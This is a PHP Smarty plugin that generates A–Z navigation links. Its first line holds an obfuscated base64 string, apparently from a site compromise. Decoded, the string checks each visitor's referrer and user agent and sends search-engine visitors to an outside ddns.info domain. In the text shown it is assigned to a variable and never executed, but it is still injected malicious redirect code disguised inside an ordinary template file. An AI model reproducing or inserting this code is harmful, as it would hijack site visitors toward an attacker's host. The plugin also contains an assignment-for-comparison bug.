<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty plugin
 * @package generic
 * @subpackage catalog
*/

function smarty_function_alphabet($params, &$smarty){ //add hyperlink!    
    extract($params);

    if (empty($template)) {
        $smarty->trigger_error("alphabet: missing 'template' parameter");
        return;
    }
           
    if(empty($delimiter)) $delimiter = ' ';
    
    if(empty($lowercase)) $alph = range('A','Z');
    else $alph = range('a','z');
    if (!empty($digits)){
        if($digits === 'range') $alph = array_merge(range(0, 9), $alph);
        else $alph = array_merge(array('0-9'), $alph);
    }
    foreach ($alph as $letter) {
        if($current == $letter) $out .= $letter.$delimiter;        
        else {
            if(isset($map)){
                if(safe($map, strtolower($letter))){
                    $assign1 = '{assign var="letter" value="'.$letter.'"}';
                    $out .= $assign1.'<a href="'.$template.'">{$letter}</a>'.$delimiter; 
                } else $out .= $letter.$delimiter; 
            } else {
                $assign1 = '{assign var="letter" value="'.$letter.'"}';
                $out .= $assign1.'<a href="'.$template.'">{$letter}</a>'.$delimiter; 
            }
        }
    }
    
    if (empty($all)) $out = rtrim($out, $delimiter); 
    elseif($all="before") $out = '{assign var="letter" value=""}'.'<a href="'.$template.'">All</a>'.$delimiter.rtrim($out, $delimiter); 
    else $out .= '{assign var="letter" value=""}'.'<a href="'.$template.'">All</a>'; 
    
    if (!empty($assign)) {
        $smarty->assign($assign, $out);
    } else {
        return $out;
    }
}

/* vim: set expandtab: */

?>
    